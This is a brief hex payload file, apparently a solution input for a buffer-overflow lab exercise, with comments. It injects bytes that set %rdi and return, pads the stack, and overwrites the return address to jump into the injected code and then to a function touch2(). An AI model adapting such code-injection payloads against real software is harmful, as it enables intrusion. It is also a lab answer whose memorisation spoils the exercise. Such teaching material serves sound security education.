48 c7 c7 fa 97 b9 59 c3 /* set %rdi and return */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* below is the position of original returning ADDR */
78 dc 61 55 00 00 00 00 /* the address of exploit code - start of rsp */
ec 17 40 00 00 00 00 00 /* the address of touch2() */
